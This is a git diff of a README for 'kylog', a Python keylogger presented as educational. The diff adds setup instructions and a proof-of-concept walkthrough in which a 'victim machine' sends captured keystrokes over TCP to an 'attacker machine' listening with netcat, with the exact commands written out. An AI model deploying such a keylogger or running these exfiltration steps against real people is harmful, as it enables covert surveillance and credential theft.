@@ -8,7 +8,7 @@
     <h4>Simple and lightweight keylogger made with Python</h4>
 </div>
 
-This project is a simple keylogger written in python for educational purposes. It captures keystrokes from the keyboard, saves the captured words into a text file (`output.txt`), and optionally sends the file to a remote machine over network.
+This project is a **simple keylogger written in python for educational purposes**. It captures keystrokes from the keyboard, saves the captured words into a text file (`output.txt`), and optionally sends the file to a remote machine over network.
 
 ## Features
 
@@ -32,7 +32,35 @@ Upon termination of the program (by pressing `ESC`), the `output.txt` file is tr
 
 The program accepts the IP address and port of the remote machine as command-line arguments, making it adaptable to different network configurations and scenarios.
 
-### POC
+## Setup
+
+### Clone the repository
+
+Clone this repository to your local machine:
+
+```bash
+git clone https://github.com/sporestudio/kylog
+cd kylog
+```
+
+### Install requirements
+
+#### Create virtual environment
+
+Create a virtual environment to install the requirements for the project (optional but recommended):
+
+```bash
+python3 -m venv kylog
+source kylog/bin/activate
+```
+
+Install the requirements:
+
+```bash
+pip install -r requirements.txt
+```
+
+## POC
 
 <div align="center">
     <img src="./.assets/imgs/kylog-diagram.png" alt="logo" width=600 heigth=149>
@@ -44,14 +72,56 @@ The program accepts the IP address and port of the remote machine as command-lin
 |  Victim Machine   |   192.168.1.66  |
 
 
+In this proof of concept we have two machines, an attacker machine and a victim machine (infected with kylog), so we will run the keylogger on the victim machine, we will capture the keystrokes and when we press ESC, we will send these keystrokes by TCP to the attacker machine. 
+
+### Setup the attacker machine
+
+<img src=".assets/imgs/attacker.png" alt="img" align="right" width="400px">
+
+On the machine that will recive the captured data:
+
+- Start listening for incoming connections with `netcat`:
+
+```bash
+nc -lvnp <port>
+```
+
+- Example:
+
+```bash
+nc -lvnp 4444
+```
+
+### Run the keylogger in the victim machine
+
+<img src=".assets/imgs/victim.png" alt="img" align="left" width="400px">
+
+On the victim machine running the keylogger, execute the script with the IP address and port of the receiver machine:
+
+```bash
+python3 src/kylog.py <ip_address> <port>
+```
+
+- Example:
+
+In our case, we want to send the `output.txt` file to **192.168.1.97** address via *4444* port.
+
+```bash
+python3 src/kylog.py 192.168.1.97 4444
+```
+
+### Stop the keylogger
+
+To stop the keylogger, press the `ESC` key. This will trigger the script to send the captured `output.txt` file to the receiver machine using the IP and port specified earlier.
+
 ## License
 
 This project is under <a href="https://github.com/sporestudio/dns-server/blob/main/LICENSE">GNU General Public License v3.0</a>
 
+
 ## Contributions
 
 Contributions are welcome! Feel free to fork the repository, submit issues, or create pull requests.
-
 
 
 ## Author
